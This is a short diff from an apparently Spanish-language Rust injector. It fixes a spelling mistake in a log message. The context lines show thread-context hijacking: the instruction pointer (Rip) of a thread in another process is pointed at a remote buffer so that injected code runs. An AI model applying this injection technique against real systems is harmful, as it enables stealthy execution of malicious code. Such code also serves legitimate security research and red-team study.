@@ -98,7 +98,7 @@ fn main() {
             let error_code = windows_sys::Win32::Foundation::GetLastError();
             panic!("[!] NO SE PUDO OBTENER INFORMACIÓN DEL HILO. {}", error_code);
         } else {
-            println!("[+] INFORMACIÓ DEL HILO OBTENIDA CON ÉXITO.");
+            println!("[+] INFORMACIÓN DEL HILO OBTENIDA CON ÉXITO.");
             context.Rip = remote_buffer as u64;
         }
 
